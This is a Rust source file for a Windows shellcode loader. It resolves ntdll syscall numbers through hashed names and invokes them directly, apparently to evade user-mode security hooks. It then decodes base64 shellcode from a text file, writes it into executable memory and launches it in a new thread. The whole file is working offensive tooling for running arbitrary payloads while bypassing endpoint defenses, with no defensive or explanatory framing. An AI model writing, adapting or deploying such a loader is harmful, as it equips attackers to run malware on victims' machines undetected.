mod gate;
mod utils;
mod pe;
use std::ffi::c_void;
use std::ptr::null_mut;
use std::fs;
use base64::engine::general_purpose;
use base64::Engine;
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use windows::Win32::System::Threading::{GetCurrentProcess, ResumeThread};
use gate::*;

// Shellcode is loaded from a base64-encoded text file

unsafe fn run_loader(table: &Table, stub: &[u8]) {
    let mut mem: *mut c_void = null_mut();
    let mut sz = stub.len();
        println!("[DEBUG] Shellcode size: {} bytes", sz);
        println!("[DEBUG] Shellcode first 16 bytes: {:02X?}", &stub[..std::cmp::min(16, stub.len())]);
    let proc = GetCurrentProcess().0 as usize;
    let mem_ptr = &mut mem as *mut _ as usize;
    let zero = 0usize;
    let sz_ptr = &mut sz as *mut _ as usize;
    let alloc_type = MEM_COMMIT.0 as usize;
    let prot = PAGE_READWRITE.0 as usize;

        BasicGate(table.alloc.syscall_id);
        let status = BasicExec(proc, mem_ptr, zero, sz_ptr, alloc_type, prot, 0, 0, 0, 0, 0);
            println!("[DEBUG] Allocated memory address: {:p}", mem);
            if status.0 != 0 {
                println!("[!] Error in syscall alloc: 0x{:08X}", status.0);
            }

        let mut written = 0usize;
        BasicGate(table.write.syscall_id);
        let status = BasicExec(proc, mem as usize, stub.as_ptr() as usize, stub.len(), &mut written as *mut _ as usize, 0, 0, 0, 0, 0, 0);
            println!("[DEBUG] Written bytes: {}", written);
            if status.0 != 0 {
                println!("[!] Error in syscall write: 0x{:08X}", status.0);
            }

        let mut old_prot: u32 = 0;
        BasicGate(table.protect.syscall_id);
        let status = BasicExec(proc, &mut mem as *mut _ as usize, &mut sz as *mut _ as usize, PAGE_EXECUTE_READWRITE.0 as usize, &mut old_prot as *mut _ as usize, 0, 0, 0, 0, 0, 0);
        if status.0 != 0 {
                println!("[!] Error in syscall protect: 0x{:08X}", status.0);
        }

        let mut th: HANDLE = HANDLE(null_mut());
            println!("[DEBUG] NtCreateThreadEx parameters:");
            println!("  thread_handle_ptr: {:p}", &mut th);
            println!("  access: 0x{:X}", 0x1FFFFF);
            println!("  attr: 0");
            println!("  proc_handle: 0x{:X}", proc);
            println!("  shellcode_addr: 0x{:X}", mem as usize);
            println!("  param: 0");
            println!("  flags: 0x{:X}", 0x00000004);
        BasicGate(table.thread.syscall_id);
        let status = BasicExec(&mut th as *mut _ as usize, 0x1FFFFF, 0, proc, mem as usize, 0, 0x2, 0, 0, 0, 0);
            println!("[DEBUG] NtCreateThreadEx status: 0x{:08X}", status.0);
            println!("[DEBUG] Thread handle: 0x{:X}", th.0 as usize);
            if status.0 != 0 {
                println!("[!] Error in syscall thread: 0x{:08X}", status.0);
            }
        ResumeThread(th);
    // Wait to ensure the shellcode thread has time to execute before process exit
    std::thread::sleep(std::time::Duration::from_secs(10));
}

fn main() {
    // Initialize the syscall table with hashes and default values
    // Resolve syscall numbers dynamically
    let mut table = Table {
        alloc: Entry { addr: null_mut(), hash: gate::custom_hash(b"NtAllocateVirtualMemory"), syscall_id: 0 },
        write: Entry { addr: null_mut(), hash: gate::custom_hash(b"NtWriteVirtualMemory"), syscall_id: 0 },
        protect: Entry { addr: null_mut(), hash: gate::custom_hash(b"NtProtectVirtualMemory"), syscall_id: 0 },
        thread: Entry { addr: null_mut(), hash: gate::custom_hash(b"NtCreateThreadEx"), syscall_id: 0 },
    };
    unsafe {
            let ntdll_base = utils::get_module_handle_unsafe("ntdll.dll");
            if ntdll_base.is_none() {
                    eprintln!("[!] Could not get handle for ntdll.dll");
                return;
            }
            let ntdll_base = ntdll_base.unwrap();
            let ntdll_ptr_cvoid = ntdll_base.0 as *mut std::ffi::c_void;
            let ntdll_ptr_u8 = ntdll_ptr_cvoid as *mut u8;
            let mut export_directory: *mut windows::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY = null_mut();
            if !pe::get_image_export_directory(ntdll_ptr_u8, &mut export_directory) {
                    eprintln!("[!] Could not get export directory");
                return;
            }
            if !pe::get_syscall_entry(ntdll_ptr_u8, export_directory, &mut table.alloc)
                || !pe::get_syscall_entry(ntdll_ptr_u8, export_directory, &mut table.write)
                || !pe::get_syscall_entry(ntdll_ptr_u8, export_directory, &mut table.protect)
                || !pe::get_syscall_entry(ntdll_ptr_u8, export_directory, &mut table.thread) {
                    eprintln!("[!] Could not build syscall table");
                return;
            }
                println!("[+] Syscall table initialized successfully: {:#?}", table);
    }
    // Set working directory to the executable's directory
    if let Ok(exe_path) = std::env::current_exe() {
        if let Some(exe_dir) = exe_path.parent() {
            std::env::set_current_dir(exe_dir).expect("Failed to set working directory");
        }
    }
    // Read shellcode from base64-encoded text file
    let b64 = match fs::read_to_string("shellcode.txt") {
        Ok(data) => data,
        Err(e) => {
                eprintln!("[!] Error reading shellcode.txt: {}", e);
            return;
        }
    };
    let shellcode = match general_purpose::STANDARD.decode(b64.trim()) {
        Ok(data) => data,
        Err(e) => {
                eprintln!("[!] Error decoding base64: {}", e);
            return;
        }
    };
    if shellcode.is_empty() {
            eprintln!("[!] Shellcode is empty");
        return;
    }
    unsafe {
        run_loader(&table, &shellcode);
    }
}